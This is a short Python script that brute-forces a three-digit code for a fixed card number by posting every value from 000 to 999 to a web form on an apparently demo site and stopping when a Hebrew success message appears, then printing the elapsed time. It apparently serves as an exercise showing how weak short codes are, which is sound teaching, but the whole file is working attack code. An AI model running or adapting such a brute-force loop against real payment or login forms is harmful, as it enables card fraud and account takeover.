import requests
import time

url = ("https://card-demo-n2f8.onrender.com/")
url_content = requests.get(url).text

start_time = time.time()
for code in range(1000):
    if code < 10:
        three_digits = "00" + str(code)
    elif code < 100:
        three_digits = "0" + str(code)
    else:
        three_digits = code
    login = {"card" : "1111222233333444" , "code" : three_digits}
    post_content = requests.post(url, data=login)
    if "הכניסה תקינה" in post_content.text:
        print(three_digits)
        break

end_time = time.time()

print(f"The time that the loop run is:  {end_time - start_time} seconds")